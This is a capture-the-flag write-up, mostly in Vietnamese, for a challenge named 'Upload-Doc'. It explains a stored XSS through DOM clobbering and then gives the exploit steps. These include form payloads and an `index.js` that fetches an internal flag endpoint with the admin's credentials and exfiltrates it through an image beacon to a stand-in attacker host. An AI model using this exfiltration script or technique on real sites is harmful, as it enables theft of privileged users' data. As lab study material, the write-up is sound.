# Upload-Doc

### ANALYZE

<figure><img src=".gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

**TL;DR:** stored XSS via **DOM clobbering**. App lookup `effects` trên `window`/`backup` rồi append `<script>` từ giá trị đó. Nếu attacker upload một `<a id="…">` trùng key (`effects`), `window[effects]` trở thành phần tử DOM chứa `href` do attacker control → app tải `http://attacker/…/index.js` → script attacker chạy trong context admin → fetch `http://127.0.0.1:5000/get_flag` với `{ credentials: 'include' }` → exfiltrate.

#### Thông tin ta có được từ desc

* Admin view: `/admin?target_user={user_id}` — mô phỏng view admin.
* Internal flag endpoint: `/get_flag` (chỉ trả trong local).
* Local port: `5000`.
* Page có form submit `name` + `link` (ảnh interface bạn gửi).

#### Root cause

Code làm kiểu:

```js
const { href } = backup[effects] || { href: effects };
```

`effects` là một string (ví dụ `'static/js/effect.js'`). Nhưng nếu DOM có phần tử `id="static/js/effect.js"`, browser exposes `window['static/js/effect.js']` → **DOM clobbering**. `backup` (copy của window) chứa tham chiếu đó, nên `href` được lấy từ `<a>` attacker chèn. Kết quả: app append `<script src="{href}/index.js"></script>` từ domain attacker.

#### Hậu quả

* Stored XSS  khi admin mở `/admin?target_user=…`.
* Script attacker có thể:
  * `fetch('http://127.0.0.1:5000/get_flag', { credentials: 'include' })`
  * lấy flag và exfiltrate (Image beacon / fetch → attacker).

***

### EXPLOIT

#### Mục tiêu

Gây stored XSS bằng cách upload link có `id` trùng `effects`, host `index.js` trên server attacker, cho admin tải, script call internal `/get_flag` rồi exfiltrate.

#### Steps (thực tế)

1. Trên form submit (hình), điền:
   * `name` = `static/js/effect.js` ← **rất quan trọng** (phải là key app lookup)
   * `link` = `http://attacker.example` ← domain bạn control
2. Submit. Khi render bạn sẽ có element như:

```html
<a data-index="0" href="http://attacker.example" target="_blank" id="static/js/effect.js">http://attacker.example</a>
```

3. Khi admin mở `/admin?target_user=...`, trang chạy:

```js
const { href } = backup[effects] || { href: effects };
// => href == 'http://attacker.example'
// append <script src="http://attacker.example/index.js"></script>
```

4. Admin browser tải `http://attacker.example/index.js` → file của bạn chạy trong context admin.
5. `index.js` fetch flag rồi exfiltrate. Ví dụ `index.js`:

```js
// http://attacker.example/index.js
fetch('http://127.0.0.1:5000/get_flag', { credentials: 'include' })
  .then(r => r.text())
  .then(flag => {
    // send via image beacon (GET param)
    const img = new Image();
    img.src = 'http://attacker-collector.example/collect?f=' + encodeURIComponent(flag);
    // ensure browser actually requests it
    document.body.appendChild(img);
  })
  .catch(e => console.error(e));
```

#### PoC payloads (dán vào form)

* `name`:

```
static/js/effect.js
```

* `link`:

```
http://attacker.example
```

Host `index.js` trên `attacker.example` (ngrok / VPS / local+ngrok). Lắng nghe truy vấn tới `/collect` để nhận flag.

#### Kiểm tra nhanh

* Sau submit, mở console trên trang (hoặc inspect) và thử:

```js
window['static/js/effect.js']   // => element <a> bạn vừa tạo
window['static/js/effect.js'].toString()  // thử xem browser trả gì
```

* Khi admin bot truy cập, server collector sẽ nhận GET với `f=<flag>`.
